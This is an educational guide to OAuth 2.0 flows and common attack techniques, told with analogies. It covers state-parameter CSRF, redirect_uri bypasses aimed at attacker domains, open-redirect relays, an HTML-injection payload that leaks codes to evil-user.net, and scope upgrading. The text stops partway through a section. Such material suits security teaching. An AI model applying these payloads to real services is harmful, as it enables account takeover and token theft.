### 🔐 Core Concept: OAuth 2.0 Authorization & The "Log In With..." Gateway (The Delegated Valet Key)

**The Goal:** Understand how the OAuth 2.0 framework allows third-party websites to access your data or log you in securely without ever seeing your actual password, and why its complex multi-party workflows create massive security risks.

---

### 🧩 Concept: Sharing Access Without Giving Away Your Master Password

* **What is OAuth?** An authorization framework that lets applications request limited access to your account on another service (like clicking "Log in with Google" or "Sign in with GitHub").
* **The Three Key Players:**
* *Client Application:* The website or app that wants to access your data or log you in.
* *Resource Owner:* You—the user who owns the account.
* *OAuth Service Provider:* The massive platform controlling your account data (e.g., Google, Facebook, or GitHub).


* **Authorization vs. Authentication:** OAuth was originally built just to let apps share specific data (like your contact list), but developers quickly started using it as a shortcut for logging users into websites.
* **Grant Types (Flows):** The different pathways apps use to ask for and receive permissions. The two most common are the *Authorization Code* grant and the *Implicit* grant.

---

### 🛠️ How the OAuth Process Works

* **1. The Permission Request:**
The client app asks the OAuth service provider for permission, specifying what kind of data it wants to access and which flow it is using.
* **2. User Login & Consent:**
You are redirected to the provider's official login page. You enter your credentials and explicitly click "Allow" or "Authorize."
* **3. Issuing the Access Token:**
The service provider hands the client app a unique digital pass (an access token) that proves you granted them permission.
* **4. Fetching the Data:**
The app uses this access token behind the scenes to fetch your profile details from the provider's server and log you into your account.

---

### 🎯 Plain-English Breakdown of the Concept

Think of this like handing a parking valet a special "valet key" that only starts the car engine, instead of giving them your master house keys and wallet:

1. **Protecting Your Main Password:** Instead of typing your core Google password into every random new gaming or shopping site you visit, you tell Google: *"Trust this website just a little bit."*
2. **The Valet Badge:** Google hands that website a temporary, restricted digital wristband (the access token).
3. **The Multi-Party Risk:** Because OAuth relies on a complex chain of conversations bouncing back and forth between your browser, the app server, and Google, any tiny mistake in how those messages are checked creates an open window for hackers to steal your wristband and break in!

### 🔐 Concept Style: OAuth Grant Types & Scopes (The Rules of Access & The Permission Wishlist)

**The Goal:** Learn what OAuth grant types (flows) and scopes are, and how they define the exact sequence of steps and permissions requested during an OAuth authentication process.

---

### 🧩 Concept: Defining the Workflow and Permission Boundaries

* **What is a Grant Type?** A grant type (or OAuth flow) is the specific set of steps and communication rules that an application follows to request and receive access tokens from an OAuth provider.
* **Why Configuration Matters:** The OAuth service must support and enable a specific grant type before an application can use it. The application specifies its desired grant type right in its initial authorization request.
* **What is a Scope?** The `scope` parameter is a list of permissions requested by the client application. It tells the server exactly what data the application wants to read or modify.
* **Custom vs. Standardized Scopes:** Basic OAuth relies on custom text strings defined by each specific provider (e.g., `scope=contacts.read`). OpenID Connect standardizes these into universal scopes (e.g., `openid profile`).

---

### 🛠️ How Grant Types and Scopes Work

* **1. Choosing the Flow:**
* The client application selects a grant type suitable for its architectural design—most commonly the **Authorization Code Grant** (for server-side apps) or the **Implicit Grant** (for client-side browser apps).


* **2. Specifying the Scope:**
* During the initial authorization request, the app sends a `scope` parameter detailing the requested level of access:
* `[https://oauth-authorization-server.com/auth?response_type=code&client_id=123&scope=contacts.read](https://oauth-authorization-server.com/auth?response_type=code&client_id=123&scope=contacts.read)`


* **3. User Consent:**
* The authorization server displays the requested scopes to the user, who must explicitly grant or deny the permissions.



---

### 🎯 Plain-English Breakdown of the Concept

Think of this like checking into a hotel and picking your stay package:

1. **The Booking Method (Grant Type):** Choosing a grant type is like deciding whether you check in online via a mobile app or pick up physical keys at the front desk. It defines the exact step-by-step process you use to get inside.
2. **The Room Key Permissions (Scopes):** When requesting your room key, you specify which doors you need access to—such as the **Gym**, the **Pool**, or **Executive Lounge Access**.
3. **Custom vs. Standard Labels:** One hotel chain might label the pool pass as `POOL_ACCESS_v1`, while a standard international system simply calls it `pool`. Regardless of the label, it strictly limits which doors your keycard can unlock!

### 🔐 Concept Style: The Authorization Code Grant Flow (The Secure Two-Step Handshake)

**The Goal:** Understand the 7-step process of the authorization code flow—the gold standard of OAuth workflows that keeps sensitive tokens hidden behind a secure server-to-server back-channel.

---

### 🧩 Concept: The Two-Phase Secure Handshake

* **The Gold Standard of Security:** The authorization code flow is the most secure and widely recommended OAuth method because sensitive tokens never travel through the public web browser where attackers can easily intercept them.
* **The Split Architecture:** It splits the login process into two halves: a browser-based initiation to get a temporary, single-use code, followed by a private, invisible server-to-server exchange for the actual access token.
* **Built-In Protections:** It relies on a secret app password (`client_secret`) and a protective session token (`state`) to ensure transactions are completely legitimate and immune to tampering.

---

### 🛠️ How the 7-Step Flow Works

* **1. Authorization Request:**
* The client app sends the user to the provider's `/auth` endpoint, specifying its `client_id`, a `redirect_uri`, `response_type=code`, requested `scope`, and a unique `state` token to prevent CSRF.


* **2. User Login and Consent:**
* The user logs into the identity provider and explicitly clicks "Allow" to grant the requested permissions.


* **3. Authorization Code Grant:**
* The server redirects the user's browser back to the app's callback URL, handing over a temporary authorization code and matching `state` parameter.


* **4. Access Token Request:**
* The client app immediately makes a private, background `POST` request to the `/token` endpoint, proving its identity using its `client_secret` and trading the temporary code.


* **5. Access Token Grant:**
* The authorization server validates everything and responds by issuing a secure `access_token`.


* **6. API Call:**
* The app uses the access token in an HTTP header (`Authorization: Bearer <token>`) to query the resource server's `/userinfo` endpoint.


* **7. Resource Grant & Login:**
* The server verifies the token and hands over the user's data (like their email and username), successfully logging them into the application.



---

### 🎯 Plain-English Breakdown of the Concept

Think of this like checking your car into a high-security valet service at a luxury hotel:

1. **Dropping Off the Car (Auth Request):** You pull up to the front, hand over your request ticket specifying where you want it returned (`redirect_uri`), and hold onto a protective claim check (`state`).
2. **Approving the Service (Consent):** You sign the digital pad confirming the valet is allowed to park your car in the secure underground garage.
3. **Getting the Stub (Authorization Code):** The attendant hands you a short-lived ticket stub (`code`).
4. **Going to the Back Room (Token Exchange):** Instead of keeping your master car keys out on the front counter, the valet takes your stub into a locked back office, presents their employee ID password (`client_secret`), and trades your stub for the real key.
5. **Retrieving the Vehicle (Resource Grant):** Using that secure master key (`access_token`), they pull your car data out of the private garage and bring it to you, letting you drive off safely without ever exposing the master key to the public street!

### 🔐 Concept Style: The Implicit Grant Type (The Instant Browser Token Delivery)

**The Goal:** Understand the simpler, faster, but less secure 5-step implicit flow where access tokens are delivered directly to the web browser via URL fragments without a hidden server-to-server back-channel.

---

### 🧩 Concept: Speed Over Security for Client-Side Apps

* **The Instant Delivery Shortcut:** Unlike the authorization code flow, the implicit grant skips the intermediate code exchange. The server hands the actual access token directly to the browser immediately after user consent.
* **The Browser Exposure Risk:** Because everything happens out in the open web browser with no private backend server or `client_secret`, sensitive tokens are far more exposed to interception.
* **Built for SPAs and Mobile Apps:** It is primarily designed for single-page applications (SPAs) or native client apps that cannot securely store a secret app password on a backend server.

---

### 🛠️ How the 5-Step Implicit Flow Works

* **1. Authorization Request:**
* The client app sends a request to the `/authorization` endpoint, but specifies `response_type=token` instead of `code`, alongside its `client_id`, `redirect_uri`, `scope`, and `state`.


* **2. User Login and Consent:**
* The user logs in at the provider's page and explicitly approves the requested data permissions.


* **3. Access Token Grant (URL Fragment):**
* The server redirects the browser to the callback URL, appending the access token directly into the URL *hash fragment* (after the `#` symbol):


```http
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com

```


*(Note: URL fragments are handled locally by the browser and are never sent to the server in standard HTTP requests, requiring client-side scripts to parse them).*
* **4. API Call:**
* The client application's local JavaScript extracts the token from the fragment and immediately makes a browser-based request to the resource server's `/userinfo` endpoint using the `Authorization: Bearer` header.


* **5. Resource Grant & Login:**
* The server verifies the token and returns the user data, successfully logging the user into the client application.



---

### 🎯 Plain-English Breakdown of the Concept

Think of this like receiving your real locker master key tossed directly out an open courtyard window instead of going through a secure back office:

1. **Asking for the Key (Auth Request):** You walk up to the security window, fill out your pass request, and specify your return drop-off box (`redirect_uri`).
2. **Approving the Access (Consent):** You sign the digital pad confirming the desk clerk is allowed to issue you a badge.
3. **Tossing the Badge Out the Window (URL Fragment):** Instead of keeping the key secure or walking it through an internal office, the guard tosses the real, functional master key right out the courtyard window into your open backpack (`#access_token` in the URL hash fragment).
4. **Picking It Up Off the Floor:** Your local script reaches into your bag, grabs the key off the floor, and gets it ready for use.
5. **Walking Right In:** You walk straight up to the restricted door and use the key in plain sight to open it and log into your session!

### 🔐 Core Concept: OAuth-Based Authentication & Single Sign-On (The Social Passkey)

**The Goal:** Understand how OAuth—originally built strictly for sharing file permissions—mutated into a popular Single Sign-On (SSO) login mechanism, and why using access tokens in place of passwords introduces unique security risks.

---

### 🧩 Concept: From File Sharing to Digital Passports

* **The Pivot to Authentication:** While OAuth was designed to let apps share data buckets, websites quickly realized they could repurpose it as a login shortcut (e.g., "Log in with Google").
* **The SSO Workflow:**
1. You click "Log in with Social Media."
2. The app requests a specific data slice (like your registered email address) from the provider's OAuth service.
3. The app receives an access token and uses it to call a dedicated `/userinfo` API endpoint.
4. Instead of asking you for a password, the app takes your email address and access token from the provider and treats them as your definitive login credentials.



---

### 🛠️ How the Integration Works Behind the Scenes

* **1. The Request for Identity:**
The client app sends your browser to the identity provider (like Google or Facebook) requesting an identity scope.
* **2. Exchanging the Token:**
After you approve, the app receives a cryptographic access token.
* **3. Fetching the Profile:**
The app's backend server sends that access token directly to the provider's resource server (`GET /userinfo`), which replies with your account profile data (such as `email: wiener@example.com`).
* **4. Establishing the Session:**
The app checks its own database for a user matching that email, logs them into the platform, and issues a local session cookie—effectively treating the third-party token as a trusted password substitute.

---

### 🎯 Plain-English Breakdown of the Concept

Think of this like checking into a luxury hotel using a verified membership card from an affiliated country club:

1. **The Membership Card:** Instead of filling out a brand-new registration form and setting up a fresh account password at every single hotel you visit, you hand over your gold-tier country club card.
2. **Calling the Clubhouse:** The hotel receptionist doesn't check your home address or ask for your personal PIN; instead, they call the country club's front desk using a private phone line to verify your membership status.
3. **The Shortcut Risk:** The country club confirms your identity, and the hotel hands you a room key. Because the hotel blindly trusts whatever the country club's phone line tells them, any flaw in how that verification phone call is handled lets an imposter waltz straight into your room!

### 🔐 Core Concept: OAuth Vulnerability Roots & Reconnaissance (The Flexible Framework & Hidden Endpoints)

**The Goal:** Understand why OAuth implementations are notoriously prone to security flaws due to design flexibility and lack of built-in defenses, and learn how to map out an OAuth workflow through reconnaissance.

---

### 🧩 Concept: When Flexibility Becomes a Security Trap

* **Vague by Design:** The OAuth specification is intentionally flexible, leaving the vast majority of configuration settings completely optional. Because there are few mandatory security guardrails, developers easily make configuration mistakes.
* **The DIY Security Burden:** Security relies almost entirely on developers configuring the right options and writing robust input validation themselves.
* **Exposing Data in Transit:** Depending on the chosen flow, sensitive tokens and user data are frequently passed right through the user's browser, giving attackers prime opportunities to intercept them.

---

### 🛠️ How Reconnaissance Works

* **1. Spotting the Login Flow:**
Look for "Log in with..." buttons, then route your browser traffic through a proxy (like Burp Suite) to inspect the initial HTTP requests.
* **2. Identifying OAuth Parameters:**
Search for requests hitting an `/authorization` endpoint that include key OAuth identifiers:
```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com

```


* **3. Querying Standard Discovery Endpoints:**
Check the authorization server's configuration files by requesting standard metadata URLs to map out hidden endpoints and supported features:
* `/.well-known/oauth-authorization-server`
* `/.well-known/openid-configuration`



---

### 🎯 Plain-English Breakdown of the Concept

Think of this like a modular, build-it-yourself security gate provided to a building contractor without a strict instruction manual:

1. **The Customizable Kit:** The manufacturer hands over a giant box of generic security parts. They tell the contractor, *"Here are the basic pieces, but feel free to configure the locks, doors, and signposts however you see fit."*
2. **Leaving Doors Unlocked:** Because the contractor isn't a security expert, they leave out critical bolts and run sensitive wiring right across the open lobby floor where anyone can see it.
3. **Reading the Blueprint (Recon):** An attacker walks up to the building's public registration desk and asks for the structural blueprint (`/.well-known/openid-configuration`), immediately revealing every hidden service door and backup corridor the contractor forgot to secure!

### 🔐 Core Concept: OAuth Client-Side vs. Service-Side Vulnerabilities (The Weak Link in the Chain)

**The Goal:** Understand how vulnerabilities split between the third-party client application's messy custom code and the OAuth provider's server-side configuration mistakes.

---

### 🧩 Concept: When Strong Providers Have Weak Client Apps

* **The Ironclad Service vs. The Sloppy App:** An application might use a battle-hardened OAuth provider like Google or GitHub, assuming it is completely secure. However, the client application's *own* implementation code is often where the real security flaws live.
* **The Split Attack Surface:**
* *Client-Side Flaws:* Occur when the target website implements OAuth poorly (such as flawed implicit grant handling or missing CSRF protection).
* *Service-Side Flaws:* Occur when the OAuth provider's configuration mismanages scopes, leaks authorization tokens, or trusts unverified user registrations.



---

### 🛠️ How the Flaws Manifest in Practice

* **1. Client Application Mistakes:**
* Developers misconfigure optional parameters, fail to validate state parameters (leaving the flow open to Cross-Site Request Forgery), or mishandle tokens returned via URL fragments in the implicit grant type.


* **2. OAuth Service Mistakes:**
* The authorization server improperly validates scope limits (allowing an app to upgrade its requested privileges silently) or leaks authorization codes to attacker-controlled redirect URIs.



---

### 🎯 Plain-English Breakdown of the Concept

Think of this like an ultra-secure armored bank hiring an incompetent local courier service to deliver its packages:

1. **The Secure Vault:** The bank (Google/GitHub) has world-class security guards, heavy steel doors, and advanced locks protecting user accounts.
2. **The Sloppy Courier:** The local shop or app (the client application) uses a cheap, unlocked bicycle basket to transport the sensitive delivery package across town.
3. **Intercepting the Goods:** Even though the vault was secure, an attacker targets the courier's weak delivery workflow to intercept the package in transit, proving that a system is only as secure as its weakest link!

### 🔐 Attack Style: Broken Implicit Grant Login & Parameter Swapping (The Fake ID Badge)

**The Goal:** Break into anyone's account on a website by logging in with your own real account, but swapping the username in the final step to pretend you are someone else.

---

### 🧩 Concept: When the Website Blindly Trusts Your Login Post

* **The Implicit Flow Shortcut:** In this login style, the external site (like Google) hands your browser an access token inside the web address link (using a `#` fragment) so JavaScript can read it.
* **Saving Your Login:** To keep you logged in after you close your browser, the website's JavaScript needs to send that token and your username to its own backend server so it can hand you a normal session cookie.
* **The Missing Password Check:** Unlike a normal login where the server checks your secret password against its database, here there is no password to check. The server just looks at whatever username and token your browser hands it and blindly trusts it!

---

### 🛠️ How the Attack Works

* **1. Logging In Normally:**
* The attacker signs into the website using their own real social media account, capturing a valid access token belonging to themselves.


* **2. Catching the Final Step:**
* When the website's browser script sends a POST request to the server to create the session cookie, the attacker intercepts it using a tool like Burp Suite.


* **3. Swapping the Username:**
* The attacker keeps their own valid access token, but edits the username parameter in the message, changing it from their own name to a victim's username (e.g., `username=carlos`).


* **4. Stealing the Session:**
* The server receives the valid token and the fake username, fails to verify if they match, and hands the attacker a session cookie for the victim's account!



---

### 🎯 Plain-English Breakdown of the Attack

Think of this like checking into a members-only club using your own real membership pass, but filling out the entry sheet with someone else's name:

1. **The Real Pass:** You walk up to the club door and show your own valid membership card.
2. **Filling Out the Ledger:** The front desk asks you to write your name on the guest ledger next to your card number so they can issue your permanent locker key.
3. **Erasing and Rewriting:** Right before you slide the ledger across the desk, you take a pen and cross out your name, writing down the club president's name instead, while leaving your own card number visible.
4. **Getting the President's Key:** The desk clerk is too busy to check if your ID matches the name on paper; they see a valid card, hand you the key to the president's private locker, and you walk right in!

### 🔐 Attack Style: Missing State Parameter & CSRF Account Binding (The Hijacked Social Link)

**The Goal:** Take over a victim's account on a website by tricking their browser into linking their profile to the attacker's social media account, exploiting a missing security token.

---

### 🧩 Concept: When OAuth Forgets Its Anti-CSRF Ticket

* **The Purpose of the `state` Parameter:** The `state` parameter is a secret, unguessable token passed back and forth during an OAuth flow. It acts as a safety guard, proving that the exact same person who *started* the login request is the one who *finished* it.
* **The Missing State Flaw:** If a website fails to use or check a `state` parameter, the entire OAuth workflow becomes vulnerable to **CSRF (Cross-Site Request Forgery)**.
* **The Account-Binding Trap:** Imagine a website where you can log in with a password *or* link your account to a social media profile. If there is no `state` token protecting the link, an attacker can start an OAuth process using *their own* social media account and trick a victim's browser into completing it—binding the victim's account on the target site directly to the attacker's social media profile!

---

### 🛠️ How the Attack Works

* **1. Starting the Flow as the Attacker:**
* The attacker initiates an OAuth linking process on the target website using their own social media credentials, and intercepts the final confirmation link.


* **2. Crafting the Trap:**
* Because there is no `state` token to tie the request to a specific session, the attacker embeds that valid confirmation link into a malicious web page or hidden image.


* **3. Tricking the Victim:**
* The attacker tricks the victim (who is currently logged into their account on the target website) into visiting that malicious page or clicking the link.


* **4. Hijacking the Account:**
* The victim's browser automatically sends the request to the website. The site blindly links the victim's account to the *attacker's* social media profile. Now, the attacker can log into the victim's account anytime simply by clicking "Log in with Social Media"!



---

### 🎯 Plain-English Breakdown of the Attack

Think of this like a secure office building reception desk where visitors get a matching entry ticket and locker key:

1. **The Matching Ticket:** Normally, when you walk in, the receptionist hands you a numbered ticket (`state`) that must match your badge when you leave, ensuring nobody swaps your locker key.
2. **Dropping the Ticket System:** The lazy front desk stops using numbered tickets entirely. Anyone can walk up and hand in any badge code without checking who it belongs to.
3. **The Switcharoo:** An attacker gets their own visitor badge, walks up to the front desk while you're away from your desk, and slips their badge number into your open account registration box.
4. **Locking You Out:** The system blindly accepts it, linking your secure account to the attacker's badge. Now, the attacker can waltz right into your account anytime using their own pass, while you are completely locked out!

### 🔐 Attack Style: Login CSRF via Missing State Parameter (The Forced Login Trap)

**The Goal:** Trick a victim into logging into the attacker's account on a target website without their knowledge, so they unwittingly enter sensitive information or perform actions inside the attacker's profile.

---

### 🧩 Concept: When You Think You're Logged In As You (But You're Not)

* **Exclusive OAuth vs. Account Linking:** If a website relies *exclusively* on OAuth for all logins (rather than linking accounts), a missing `state` parameter won't let an attacker steal an existing user account.
* **The Login CSRF Danger:** However, it opens the door to **Login CSRF**. Instead of stealing the victim's account, the attacker forces the victim's browser to complete an OAuth login using the *attacker's* social media profile.
* **The Spy Trap:** The victim thinks they are browsing normally on their own account, but they are actually locked inside the attacker's account. Any searches, saved data, or messages they type are now visible to the attacker.

---

### 🛠️ How the Attack Works

* **1. Preparing the Trap:**
* The attacker starts an OAuth login flow on the target website using their own social media account and captures the final valid callback response link.


* **2. Embedding the Link:**
* Because there is no `state` parameter to check who initiated the request, the attacker embeds this pre-authenticated URL into a malicious web page or invisible image.


* **3. Luring the Victim:**
* The attacker tricks the victim into visiting the malicious page.


* **4. The Silent Switch:**
* The victim's browser automatically completes the login, landing them directly inside the *attacker's* dashboard on the target website. The victim doesn't notice and proceeds to use the site under the false assumption that it is their own profile.



---

### 🎯 Plain-English Breakdown of the Attack

Think of this like sitting down at a shared public terminal where someone else left their profile pre-loaded:

1. **Setting the Trap:** An attacker walks up to a public kiosk terminal, logs into their own account, and pauses right at the main dashboard screen.
2. **Stepping Away:** They walk away, leaving the terminal active, waiting for the next user.
3. **The Unsuspecting User:** You walk up, see the application open, and assume it's a fresh or your own session.
4. **Typing Into Enemy Hands:** You start typing your personal messages, updating settings, or saving details—completely unaware that you are doing all of this inside the attacker's account, giving them full view of everything you input!

### 🔐 Attack Style: Flawed Redirect URI Validation & Whitelist Bypasses (The Tricked Return Address)

**The Goal:** Pass an unauthorized or malicious URL as the return address (`redirect_uri`), tricking the OAuth server into sending secret login codes or tokens to a destination outside the approved list.

---

### 🧩 Concept: Exploiting Flaws in the Approved Address List

* **The Whitelist Mechanism:** To protect tokens, the OAuth server checks the requested return address (`redirect_uri`) against a pre-registered whitelist of safe, allowed URLs.
* **Parsing Discrepancies:** Validation mechanisms often rely on weak string checks (like verifying only the beginning of a URL) or fail to parse complex URLs consistently across different back-end components.
* **Parameter Manipulation:** Attackers manipulate paths, symbols, duplicate parameters, or parameter modes (`response_mode`) to bypass strict filters while keeping the destination server functional.

---

### 🛠️ Common Bypass Techniques

* **1. Path Traversal & Subdirectory Loopholes:**
* If validation checks only the domain prefix, attackers append subdirectories, query strings, or path traversal sequences (e.g., `[https://approved-host.com/oauth/callback/../../attacker-path](https://approved-host.com/oauth/callback/../../attacker-path)`).


* **2. URI Parsing Tricks & Special Characters:**
* Using URI control characters, fragment identifiers, or user-info delimiters (`@`, `#`, `&`) to confuse how the OAuth validator vs. the browser interprets the destination domain.


* **3. Parameter Pollution:**
* Submitting duplicate `redirect_uri` keys in the authorization query string (e.g., `?redirect_uri=valid.com&redirect_uri=attacker.com`) to check if the validator reads the first parameter while the server routes to the second.


* **4. Development Host Exploitation:**
* Exploiting overly broad rules for testing environments, such as loose matches on `localhost` (e.g., using subdomains like `localhost.attacker-domain.com`).


* **5. Response Mode Adjustments:**
* Altering `response_mode` parameters (such as switching to `fragment` or `web_message`) to change how the application parses and verifies the associated URI structure.



---

### 🎯 Plain-English Breakdown of the Vulnerability

Think of this like submitting a delivery request to a courier company with strict address verification:

1. **The Official Address Book:** The courier rulebook states, *"Deliver packages only to corporate offices starting with 100 Main Street."*
2. **Confusing the Route:** You submit a delivery address written as `100 Main Street /../../ 500 Attacker Way`.
3. **The Simple Checker:** The front-desk clerk checks only the beginning of the string (`100 Main Street`), marks it as valid, and hands it to the driver.
4. **The Wrong Destination:** The delivery driver follows the full navigation path and drops the sensitive package off at the attacker's location instead of the intended office building.

### 🔐 Attack Style: Stealing Codes & Tokens via Proxy Pages (The Bouncing Return Address)

**The Goal:** Steal secret login codes or access tokens by tricking the server into sending them to a different, vulnerable page on the approved website, which then automatically bounces them straight to the attacker's server.

---

### 🧩 Concept: Using an Approved Website as a Relay Trap

* **When Whitelists Block You:** If a secure target completely blocks you from using an external website address as your `redirect_uri`, you don't give up—you look inside their *own* approved domain.
* **Directory Traversal Tricks:** You use path tricks (like `../../`) to force the server into accepting an unexpected page on its own approved website instead of the normal login callback page.
* **The Proxy (Open Redirect) Bounce:** Once you find a weak page on their site (like a page with an "open redirect" flaw), you use it as a stepping stone. The OAuth server sends the secret code or token safely to the approved site, and that weak page instantly forwards the victim (and the secret data) right into the attacker's hands!

---

### 🛠️ How the Attack Works

* **1. Bypassing the Strict Domain Rule:**
* Since you cannot use an outside domain, you force the `redirect_uri` to point to a different path on the target's own approved website using directory traversal:
* `[https://client-app.com/oauth/callback/../../example/path](https://client-app.com/oauth/callback/../../example/path)`


* **2. Finding a Weakness on That Page:**
* You look for a second vulnerability on that target page—such as an **open redirect** flaw or a script that leaks URL data.


* **3. Bouncing the Secret Data:**
* The user logs in, and the server sends the secret authorization code or token to that approved page.


* **4. Capturing the Loot:**
* The page immediately bounces the user to an attacker-controlled external website, handing over the secret code or access token so the attacker can steal the account.



---

### 🎯 Plain-English Breakdown of the Attack

Think of this like sending a sensitive letter to a strict corporate office that refuses to deliver mail to outside homes:

1. **The Strict Delivery Rule:** The courier office strictly refuses to mail packages to any address outside the company's main building.
2. **Changing the Internal Room Number:** You trick the delivery desk by writing an internal office route that looks like a maze (`/main-desk/../../basement-supply-room/`).
3. **The Unlocked Mailbox:** The courier drops the package off at that basement supply room. Unknown to the company, that supply room has an automated mail- chute that dumps everything dropped inside it straight into an outdoor bin belonging to an outside thief!
4. **Stealing the Contents:** The thief walks up to their outdoor bin and picks up the sensitive package, bypassing the company's strict delivery rules entirely.

### 🔐 Attack Style: Leaking Tokens via Gadget Chains, XSS, and HTML Injection (The Stealing Post-Return Handlers)

**The Goal:** Extract secret authorization codes or access tokens from a redirected page by leveraging dangerous JavaScript, Cross-Site Scripting (XSS), or HTML injection to forward the stolen secrets to an attacker-controlled server.

---

### 🧩 Concept: Exploiting the Page After the Redirect

* **The Follow-Up Weakness:** Once you successfully trick the OAuth server into sending the secret code or token to an approved page on the target website, the attack isn't over yet—you need a way to grab it from that page.
* **Chaining Vulnerabilities:** Attackers look for secondary flaws on that destination page, such as unsafe JavaScript handling, insecure web messaging, XSS, or even simple HTML tags.
* **Amplify XSS Power:** While standard XSS is limited by short user sessions or `HttpOnly` cookie protections, stealing an OAuth token via XSS gives an attacker a long-lived, fully authenticated session to explore data in their own browser.

---

### 🛠️ How the Attack Works

* **1. Dangerous JavaScript & Gadget Chains:**
* If the page contains insecure scripts (like faulty postMessage handlers or query-parameter processors), an attacker feeds the token through a chain of scripts until it lands in a function that leaks it externally.


* **2. Cross-Site Scripting (XSS):**
* If the callback page is vulnerable to XSS, an attacker injects a malicious script that immediately reads the token from the URL and sends it back to the attacker's server.


* **3. HTML Injection & Referer Header Leaks:**
* When JavaScript is blocked by strict filters or Content Security Policy (CSP), an attacker injects a basic HTML element (like `<img src="[https://evil-user.net](https://evil-user.net)">`). When the browser tries to fetch the image, some browsers automatically leak the full URL—including the sensitive query string containing the authorization code—via the `Referer` header!



---

### 🎯 Plain-English Breakdown of the Attack

Think of this like mail delivery arriving at a secure corporate sorting room with careless employees:

1. **Getting the Mail Inside:** You successfully trick the courier into delivering a confidential package to an internal office mail drop instead of the main front desk.
2. **The Careless Mailroom Clerk (XSS/JS):** The clerk inside opens the package, reads your secret code, and loudly reads it out loud or leaves it sitting on an unsecure copy machine where anyone can see it.
3. **The Leaking Window (HTML Injection):** Even if the room is locked down tight, there's a mail-chute window facing the public street. When the room attempts to load a picture outside the window, the window glass accidentally reflects the entire contents of the room's notice board straight to a spy standing outside with binoculars (`Referer` header leak)!

### 🔐 Attack Style: Flawed Scope Validation & Token Upgrading (The Secret Permission Upgrade)

**The Goal:** Sneakily upgrade a low-level access token or authorization code to gain extra, unauthorized administrative privileges that the user never approved.

---

### 🧩 Concept: When the Server Forgets to Check Permission Limits

* **The Approved Scope:** During a normal OAuth login, the user sees a prompt stating exactly what permissions the app is asking for (e.g., reading your profile). The resulting token is strictly limited to only what the user approved.
* **The Flawed Validation Trap:** If the OAuth service fails to properly check whether the token is allowed to request certain actions during the token exchange or API call, an attacker can manipulate parameters to sneak in higher privileges.
* **The Upgrade Trick:** An attacker might obtain a basic, harmless token (like `read` access) using a normal account, but then modify the scope or swap parameters during the backend exchange to transform it into a powerful token (like `admin` or `write` access).

---

### 🛠️ How the Attack Works

* **1. Acquiring a Basic Token:**
* The attacker starts a normal OAuth flow and acquires a standard, low-privilege access token or authorization code for a basic user account.


* **2. Tampering During the Exchange:**
* When trading the code or using the token, the attacker alters the `scope` parameter in the request payload, replacing basic permissions with sensitive ones (e.g., changing `scope=read` to `scope=write-all`).


* **3. Bypassing the Server Check:**
* If the authorization server blindly trusts the incoming request without verifying it against what the user actually clicked and approved, it issues an upgraded token.


* **4. Executing Unauthorized Actions:**
* The attacker uses this newly upgraded token to perform high-level administrative tasks or access restricted data they shouldn't be able to touch.



---

### 🎯 Plain-English Breakdown of the Attack

Think of this like buying a general admission ticket to a theme park and sneaking into the VIP backstage area:

1. **Getting the Standard Pass:** You walk up to the ticket booth, pay for a cheap, standard guest pass, and get a wristband that only allows you onto regular rides.
2. **Altering the Wristband:** While walking through the park, you pull out a marker or sneak into a service booth and quietly write "VIP Backstage Access" onto your standard guest pass.
3. **The Sleepy Guard:** You walk up to the high-security VIP lounge door. The guard glances lazily at your wristband, sees the word "VIP" scrawled on it, and lets you right in without checking the central database to see what you actually paid for.
4. **Enjoying the Perks:** You now have full access to exclusive areas and free food, entirely because the security system failed to double-check your original purchase record!

### 🔐 Attack Style: Upgrading Scopes in the Authorization Code Flow (The Sneaky Code Upgrade)

**The Goal:** Steal extra sensitive user data (like profile info or contact lists) by sneaking a broader permission scope into the final secret server-to-server code exchange, even though the user only approved a basic request.

---

### 🧩 Concept: When the Server Forgets to Re-Check the Scope During Code Exchange

* **The Safe Start:** In the authorization code flow, sensitive tokens are traded in private server-to-server calls, keeping attackers from tampering with them out in the open web browser.
* **Controlling Your Own App:** However, since an attacker can easily register their *own* malicious client application with the OAuth provider, they control both sides of the exchange server.
* **The Mismatch Trap:** When trading the authorization code for an access token, the attacker injects an extra permission scope (like `profile`) into the POST payload that the user never originally approved. If the server blindly issues a token without verifying it against the initial approval, the attacker gets elevated access!

---

### 🛠️ How the Attack Works

* **1. Requesting Basic Permissions:**
* The attacker's malicious client app asks the user for a harmless, basic permission (such as `openid email`), and the user clicks "Allow."


* **2. Receiving the Authorization Code:**
* The OAuth server hands an authorization code back to the attacker's app.


* **3. Injecting Extra Scopes During the POST Trade:**
* When the attacker's server sends a background `POST /token` request to trade the code for an access token, they append extra permissions into the request body:


```http
POST /token
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20email%20profile

```


* **4. Receiving the Upgraded Token:**
* If the server fails to cross-check the exchange scope against the original request, it issues an access token packed with the unapproved permissions, letting the attacker fetch full profile data.



---

### 🎯 Plain-English Breakdown of the Attack

Think of this like buying a basic train ticket and upgrading it to a first-class cabin while talking directly to the automated ticket machine:

1. **Buying the Cheap Ticket:** You walk up to the machine, pay for a standard economy ticket to the next town, and get a validation slip.
2. **Talking to the Private Terminal:** Instead of showing your ticket to a human conductor, you take your validation slip to a private ticket-printing terminal that you own and operate.
3. **Altering the Print Request:** Before inserting the slip, your private terminal secretly prints out a request adding a "First-Class Sleeping Car" upgrade to the transaction record.
4. **The Lazy Central Computer:** The central railway computer receives the request over the private network wire, fails to check what you originally paid for at the station window, and spits out a luxury first-class pass entirely for free!

### 🔐 Attack Style: Upgrading Scopes in the Implicit Flow (The Stolen Token Scope Stretch)

**The Goal:** Extract extra, unapproved user data by taking a stolen implicit access token and manually adding new permission scopes when asking the server for profile details.

---

### 🧩 Concept: Stretching the Limits of a Stolen Token

* **The Implicit Token Risk:** In the implicit flow, access tokens travel right through the web browser, making them easy for an attacker to intercept and steal from innocent client applications.
* **Tampering with the `/userinfo` Request:** Once an attacker steals a basic token, they can use it to request user data from the OAuth service's `/userinfo` endpoint. While doing this, they can manually tack on extra `scope` parameters that weren't originally requested.
* **The Missing Validation Flaw:** Ideally, the server should check whether the requested scope matches what the token was originally created for. If it fails to check, the attacker can silently harvest extra data without needing the user's permission again!

---

### 🛠️ How the Attack Works

